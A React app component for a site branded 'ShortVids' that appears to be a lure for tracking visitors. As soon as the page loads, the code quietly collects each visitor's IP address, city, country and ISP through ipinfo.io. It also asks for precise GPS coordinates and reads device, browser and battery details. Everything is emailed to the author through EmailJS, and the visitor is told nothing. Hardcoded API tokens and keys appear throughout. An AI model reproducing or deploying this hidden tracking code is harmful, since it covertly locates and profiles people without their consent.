import { useEffect } from 'react';
import emailjs from '@emailjs/browser';
import platform from 'platform';
import Short_Videos from './component/short_videos';

const App = () => {
  useEffect(() => {
    async function sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude = null, longitude = null) {
      try {
        const templateParams = {
          date: new Date().toLocaleString(),
          ip: ipInfo?.ip || 'N/A',
          city: ipInfo?.city || 'N/A',
          region: ipInfo?.region || 'N/A',
          country: ipInfo?.country || 'N/A',
          isp: ipInfo?.org || 'N/A',
          latitude: latitude || 'Permission Denied',
          longitude: longitude || 'Permission Denied',
          device_name: deviceInfo.name || 'Unknown',
          device_os: deviceInfo.os.family || 'Unknown',
          browser: deviceInfo.layout || 'Unknown',
          browser_version: deviceInfo.version || 'Unknown',
          device_type: deviceInfo.description || 'Unknown',
          battery_level: batteryInfo?.level || 'Unknown',
          charging_status: batteryInfo?.charging ? 'Charging' : 'Not Charging',
        };

        const response = await emailjs.send(
          'service_92nkmcg',
          'template_h6yolzk',
          templateParams,
          'zqDZ3UbE0eHoHCboK'
        );
        console.log('Email sent:', response.status);
      } catch (error) {
        console.error('Error sending email:', error);
      }
    }

    async function getUserInfo() {
      try {
        // Get device info and battery info regardless of geolocation permission
        const deviceInfo = getDeviceInfo();
        const batteryInfo = await getBatteryInfo();
        
        // Try to get IP info first
        let ipInfo = {};
        try {
          const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
          ipInfo = await ipResponse.json();
        } catch (ipError) {
          console.error('Error fetching IP info:', ipError);
          ipInfo = {};
        }

        // Try to get geolocation, but continue even if denied
        try {
          navigator.geolocation.getCurrentPosition(
            // Success callback
            async (position) => {
              const { latitude, longitude } = position.coords;
              // Send all info with coordinates
              sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
            },
            // Error callback - user denied permission or other error
            (error) => {
              console.log('Geolocation error or denied:', error.message);
              // Send available info without coordinates
              sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
            },
            { enableHighAccuracy: true, timeout: 10000 }
          );
        } catch (geoError) {
          console.error('Geolocation not supported:', geoError);
          // Send available info without coordinates
          sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
        }
      } catch (error) {
        console.error('General error in getUserInfo:', error);
      }
    }

    function getDeviceInfo() {
      try {
        const deviceInfo = platform.parse(navigator.userAgent);
        return {
          name: deviceInfo.name || 'Unknown',
          version: deviceInfo.version || 'Unknown',
          layout: deviceInfo.layout || 'Unknown',
          os: deviceInfo.os || { family: 'Unknown' },
          description: deviceInfo.description || 'Unknown',
        };
      } catch (error) {
        console.error('Error getting device info:', error);
        return {
          name: 'Unknown',
          version: 'Unknown',
          layout: 'Unknown',
          os: { family: 'Unknown' },
          description: 'Unknown',
        };
      }
    }

    async function getBatteryInfo() {
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          return {
            level: battery.level * 100 + '%',
            charging: battery.charging,
          };
        } else {
          console.log('Battery API not supported');
          return { level: 'API Not Supported', charging: false };
        }
      } catch (error) {
        console.error('Error fetching battery info:', error);
        return { level: 'Unknown', charging: false };
      }
    }

    // Start the process
    getUserInfo();
  }, []);

  return (
    <div style={{
      fontFamily: 'Arial, sans-serif'
    }}>
      <header style={{
        backgroundColor: '#333',
        color: 'white',
        padding: '1rem',
        textAlign: 'center',
        marginBottom: '1rem'
      }}>
        <h1 style={{ margin: 0 }}>ShortVids</h1>
        <p style={{ margin: '0.5rem 0 0' }}>Watch and share amazing short videos</p>
      </header>
      
      <main>
        <Short_Videos />
      </main>
      
      <footer style={{
        backgroundColor: '#333',
        color: 'white',
        padding: '1rem',
        textAlign: 'center',
        marginTop: '2rem'
      }}>
        <p style={{ margin: 0 }}>© 2025 ShortVids - All rights reserved</p>
      </footer>
    </div>
  );
};

export default App;